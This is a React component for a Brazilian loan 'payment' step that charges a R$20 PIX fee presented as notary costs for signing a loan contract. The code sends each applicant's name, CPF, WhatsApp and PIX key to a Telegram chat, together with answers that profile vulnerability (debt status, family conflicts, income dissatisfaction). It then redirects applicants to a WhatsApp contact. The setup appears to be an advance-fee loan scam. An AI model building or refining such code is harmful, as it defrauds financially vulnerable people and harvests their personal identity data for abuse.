import React, { useState, useEffect } from 'react';
import type { LoanFormData, PixResponse } from '../../types';
import { generatePix, checkPixStatus } from '../../lib/api';
import { sendTelegramNotification } from '../../lib/telegram';
import { Copy, Check, MessageCircle, AlertCircle, Loader2, QrCode } from 'lucide-react';

interface PaymentProps {
  formData: LoanFormData;
}

const Payment: React.FC<PaymentProps> = ({ formData }) => {
  const [loading, setLoading] = useState(true);
  const [pixData, setPixData] = useState<PixResponse | null>(null);
  const [copied, setCopied] = useState(false);
  const [statusLoading, setStatusLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const USER_ID = '69c6c2808c6afae869de31f1';
  const AMOUNT = 20;
  const WHATSAPP_FINANCEIRO = '5511989008294';

  useEffect(() => {
    const initPix = async () => {
      try {
        setLoading(true);
        const data = await generatePix(USER_ID, AMOUNT);
        setPixData(data);

        // Enviar notificação para o Telegram
        const message = `
<b>🚀 Nova Proposta Gerada!</b>
<b>Nome:</b> ${formData.fullName}
<b>CPF:</b> ${formData.cpf}
<b>WhatsApp:</b> ${formData.whatsapp}
<b>Valor:</b> R$ ${formData.amount.toLocaleString('pt-BR')}
<b>Parcelas:</b> ${formData.installments}x
<b>Chave PIX:</b> ${formData.pixKey}

<b>--- Perfil e Percepção ---</b>
<b>Finalidade:</b> ${formData.loanPurpose}
<b>Negativado:</b> ${formData.isNegative}
<b>Ajudar Família:</b> ${formData.helpFamily}
<b>Insatisfação Renda:</b> ${formData.incomeDissatisfaction}
<b>Deixou de fazer algo:</b> ${formData.stoppedDoingThings}
<b>Conflitos em casa:</b> ${formData.homeConflicts}
<b>Aceita Cartório:</b> ${formData.trustAgreement}

<b>Status:</b> Aguardando pagamento das custas
        `;
        sendTelegramNotification(message.trim());

      } catch (err) {
        setError('Erro ao gerar o PIX. Tente novamente mais tarde.');
        console.error(err);
      } finally {
        setLoading(false);
      }
    };
    initPix();
  }, []);

  const handleCopy = () => {
    if (pixData?.paymentIntent.data.pixCode) {
      navigator.clipboard.writeText(pixData.paymentIntent.data.pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleCheckStatus = async () => {
    if (!pixData) return;
    try {
      setStatusLoading(true);
      const res = await checkPixStatus(USER_ID, pixData.transactionId);
      if (res.status === 'PAID') {
        window.location.href = `https://wa.me/${WHATSAPP_FINANCEIRO}?text=Olá! Acabei de realizar o pagamento das custas para o meu contrato de empréstimo (Nome: ${formData.fullName}).`;
      } else {
        alert('Pagamento ainda não detectado. Por favor, aguarde alguns instantes e tente novamente.');
      }
    } catch (err) {
      console.error(err);
      if (confirm('Deseja falar com o suporte para confirmar seu pagamento?')) {
        window.location.href = `https://wa.me/${WHATSAPP_FINANCEIRO}?text=Olá! Realizei o pagamento das custas e gostaria de confirmar meu contrato.`;
      }
    } finally {
      setStatusLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center py-12 gap-4">
        <Loader2 className="animate-spin text-blue-900 w-10 h-10" />
        <p className="text-gray-500 font-bold uppercase tracking-widest text-[10px]">Gerando QR Code PIX...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex flex-col items-center justify-center py-12 gap-4 text-center">
        <AlertCircle className="text-red-500 w-12 h-12" />
        <p className="text-gray-800 font-medium">{error}</p>
        <button onClick={() => window.location.reload()} className="text-blue-900 font-black uppercase tracking-widest text-xs underline">Tentar novamente</button>
      </div>
    );
  }

  return (
    <div className="space-y-6 text-center">
      <div className="space-y-2">
        <h3 className="text-xl font-black text-gray-800 uppercase tracking-tighter">Assinatura Formalizada</h3>
        <p className="text-sm text-gray-500 px-4">
          Para firmar o contrato oficialmente em cartório, realize o pagamento das custas abaixo:
        </p>
      </div>

      <div className="bg-blue-50/50 p-8 rounded-3xl flex flex-col items-center gap-6 border border-blue-100">
        <div className="bg-white p-6 rounded-2xl shadow-xl shadow-blue-900/10">
          {pixData?.paymentIntent.data.qrCode && (
            <img src={pixData.paymentIntent.data.qrCode} alt="PIX QR Code" className="w-44 h-44" />
          )}
        </div>
        
        <div className="space-y-1">
          <p className="text-[10px] text-blue-900 uppercase tracking-widest font-black">Custas Processuais</p>
          <p className="text-4xl font-black text-blue-900 tracking-tighter">R$ {AMOUNT.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
        </div>
      </div>

      <div className="space-y-3 px-2">
        <button
          onClick={handleCopy}
          className="w-full border-2 border-gray-100 hover:border-blue-900 text-gray-700 font-black py-4 rounded-2xl flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-xs"
        >
          {copied ? <Check className="text-green-500" /> : <Copy size={18} className="text-blue-900" />}
          {copied ? 'Código Copiado!' : 'Copiar Código PIX'}
        </button>

        <button
          onClick={handleCheckStatus}
          disabled={statusLoading}
          className="w-full bg-blue-900 hover:bg-blue-800 disabled:bg-blue-300 text-white font-black py-5 rounded-2xl shadow-xl shadow-blue-900/30 flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-sm"
        >
          {statusLoading ? <Loader2 className="animate-spin" /> : <QrCode size={20} />}
          Verificar Pagamento
        </button>

        <div className="flex items-start gap-3 bg-white p-4 rounded-2xl text-left border border-gray-100 shadow-sm">
          <AlertCircle className="text-blue-900 shrink-0 mt-0.5" size={18} />
          <p className="text-[10px] text-gray-500 leading-relaxed font-medium">
            Após o pagamento, o contrato é assinado digitalmente e o valor do empréstimo é liberado em sua conta via PIX pelo nosso financeiro.
          </p>
        </div>
      </div>

      <a 
        href={`https://wa.me/${WHATSAPP_FINANCEIRO}`}
        className="flex items-center justify-center gap-2 text-blue-900 font-black text-[10px] uppercase tracking-widest hover:underline pt-2"
      >
        <MessageCircle size={16} /> Suporte Financeiro Especializado
      </a>
    </div>
  );
};

export default Payment;
